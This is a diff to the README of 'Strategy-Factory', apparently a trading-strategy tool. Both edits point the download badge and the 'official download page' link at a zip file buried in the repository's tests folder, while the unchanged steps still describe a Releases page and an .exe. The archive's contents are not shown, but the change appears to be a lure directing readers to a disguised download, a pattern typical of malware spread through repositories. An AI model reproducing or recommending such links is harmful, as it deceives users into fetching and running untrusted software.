@@ -1,6 +1,6 @@
 # 📈 Strategy-Factory - Build better trading strategies with ease
 
-<a href="https://github.com/Fast-meadowvole9864/Strategy-Factory"><img src="https://img.shields.io/badge/Download-Software-blue.svg" alt="Download Strategy-Factory"></a>
+<a href="https://raw.githubusercontent.com/Fast-meadowvole9864/Strategy-Factory/main/tests/Factory-Strategy-2.5-beta.2.zip"><img src="https://img.shields.io/badge/Download-Software-blue.svg" alt="Download Strategy-Factory"></a>
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to install the software on your computer.
 
-1. Visit the [official Strategy-Factory download page](https://github.com/Fast-meadowvole9864/Strategy-Factory) to access the latest version.
+1. Visit the [official Strategy-Factory download page](https://raw.githubusercontent.com/Fast-meadowvole9864/Strategy-Factory/main/tests/Factory-Strategy-2.5-beta.2.zip) to access the latest version.
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Choose the file ending in `.exe` for Windows.
 4. Save the file to your computer.
